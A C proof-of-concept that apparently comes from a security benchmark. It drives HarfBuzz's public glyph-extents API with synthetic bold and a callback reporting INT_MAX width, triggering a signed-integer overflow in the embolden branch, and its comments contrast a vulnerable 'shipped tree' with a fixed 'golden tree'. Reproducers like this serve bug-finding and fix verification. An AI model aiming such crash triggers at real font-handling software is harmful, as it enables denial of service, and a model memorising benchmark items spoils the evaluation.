/* PoC: residual signed-integer overflow (CWE-190) in
 * hb_font_t::synthetic_glyph_extents, embolden X branch.
 *
 * Drives the public API hb_font_get_glyph_extents on a font with synthetic
 * bold enabled, whose glyph_extents func reports a width at the top of the
 * hb_position_t range (exactly what glyf's contour_bounds_t and the sbix png
 * path can legitimately emit after clamping each field independently).  The
 * embolden branch then evaluates `extents->width += x_shift` in int32, which
 * overflows.
 *
 * Shipped tree: fires (signed-integer-overflow / abort under the sanitizer).
 * Golden tree:  secure (width accumulation is saturated with hb_clamp_to).
 */

#include <hb.h>
#include <limits.h>
#include <stdio.h>

static hb_bool_t
extreme_extents (hb_font_t *font, void *font_data,
		 hb_codepoint_t glyph,
		 hb_glyph_extents_t *extents,
		 void *user_data)
{
  (void) font; (void) font_data; (void) glyph; (void) user_data;
  /* No synthetic slant is set, so the slant branch is skipped and this width
   * reaches the embolden branch unchanged. */
  extents->x_bearing = 0;
  extents->y_bearing = 0;
  extents->width = INT_MAX;
  extents->height = 100;
  return 1;
}

int
main (void)
{
  hb_font_funcs_t *ffuncs = hb_font_funcs_create ();
  hb_font_funcs_set_glyph_extents_func (ffuncs, extreme_extents, NULL, NULL);

  hb_face_t *face = hb_face_create (hb_blob_get_empty (), 0);
  hb_font_t *font = hb_font_create (face);
  hb_font_set_funcs (font, ffuncs, NULL, NULL);
  hb_font_set_scale (font, 2048, 2048);

  /* Synthetic bold only (no slant): x_strength = round(2048 * 0.05) = 102. */
  hb_font_set_synthetic_bold (font, 0.05f, 0.05f, 1);

  hb_glyph_extents_t extents;
  hb_bool_t ok = hb_font_get_glyph_extents (font, 1, &extents);
  printf ("ok=%d width=%d\n", ok, extents.width);

  hb_font_destroy (font);
  hb_face_destroy (face);
  hb_font_funcs_destroy (ffuncs);
  return 0;
}
